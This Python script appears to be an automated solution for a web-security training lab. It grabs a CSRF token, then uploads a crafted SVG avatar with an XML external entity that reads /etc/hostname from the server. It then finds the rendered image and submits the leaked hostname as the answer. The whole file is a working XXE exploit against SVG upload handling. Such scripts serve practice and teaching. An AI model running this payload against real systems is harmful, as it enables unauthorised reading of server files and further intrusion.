from ..utils import *

from urllib.parse import urlencode, urljoin
from bs4 import BeautifulSoup
from html import unescape
from lxml import etree

import requests


def solve_lab(url, proxies):
    # Grab CSRF value
    url = urljoin(url, "/post")
    params = {"postId": 1}
    print_info(f'Grabbing CSRF value from "{url}?{urlencode(params)}"')

    s = requests.session()
    resp = s.get(url, params=params, proxies=proxies, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    csrf = soup.select_one('input[name="csrf"]').get("value")

    if csrf is None:
        print_fail("Unable to grab CSRF value.")
    else:
        print_success(f"CSRF value: {csrf}\n")

    # Construct SVG
    svg_namespace = "http://www.w3.org/2000/svg"
    svg = "{%s}" % svg_namespace
    nsmap = {None: svg_namespace}

    svg = etree.Element(
        "svg", nsmap=nsmap, width="128px", height="128px", version="1.1"
    )
    kwargs = {"font-family": "Consolas", "font-size": "16", "x": "0", "y": "16"}
    etree.SubElement(svg, "text", **kwargs).text = "&xxe;"

    doctype = '<!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>'
    avatar = etree.tostring(svg, doctype=doctype)
    avatar = unescape(avatar.decode())

    # Submit post comment
    files = {
        "avatar": ("avatar.svg", avatar),
    }

    data = {
        "csrf": csrf,
        "postId": "1",
        "comment": "comment",
        "name": "user",
        "email": "user@example.com",
        "website": "",
    }

    url = urljoin(url, "/post/comment")
    print_info(
        f'Injecting an XML external entity with the following POST request form data to "{url}":\n'
    )
    print(f"data: {data}\n")
    print(f"files: {files}\n")

    resp = s.post(url, proxies=proxies, verify=False, data=data, files=files)
    if resp.status_code == 200:
        print_success("XXE injection successful.\n")
    else:
        print_fail("XXE injection not successful.")

    # Extract avatar image URL
    url = urljoin(url, "/post")
    params = {"postId": 1}
    print_info(f'Extracting avatar image URL from "{url}?{urlencode(params)}"')

    s = requests.session()
    resp = s.get(url, params=params, proxies=proxies, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    avatar_img = soup.select(".avatar")
    if len(avatar_img) == 0:
        print_fail("Unable to extract avatar image URL.")
    else:
        avatar_url = urljoin(url, avatar_img[-1].get("src"))
        print_success(f"Avatar image URL: {avatar_url}\n")

    # Submit hostname as solution
    hostname = print_input("Enter the hostname from the provided URL here: ")
    print_info("Submitting hostname as solution...")
    url = urljoin(url, "/submitSolution")
    data = {"answer": hostname}
    resp = requests.post(url, proxies=proxies, verify=False, data=data)

    if resp.json()["correct"]:
        print_success("Correct answer!\n")
    else:
        print_fail("Incorrect answer.")
